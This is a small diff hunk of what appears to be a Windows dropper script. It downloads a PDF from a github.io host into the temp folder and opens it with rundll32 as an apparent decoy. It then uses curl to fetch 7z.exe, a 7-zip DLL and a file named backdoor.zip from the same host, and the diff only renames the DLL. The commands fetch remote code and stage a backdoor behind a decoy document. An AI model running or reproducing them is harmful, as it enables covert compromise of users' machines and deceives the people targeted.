@@ -8,5 +8,5 @@ curl https://sheng855174.github.io/pdf-test.pdf -o "%temp%\pdf-test.pdf"
 rundll32 url.dll,FileProtocolHandler file:///%temp%/pdf-test.pdf
 
 curl https://sheng855174.github.io/7z.exe -o "%temp%\7z.exe"
-curl https://sheng855174.github.io/7-zip.dll -o "%temp%\7-zip.dll"
+curl https://sheng855174.github.io/7z.dll -o "%temp%\7z.dll"
 curl https://sheng855174.github.io/backdoor.zip -o "%temp%\backdoor.zip"
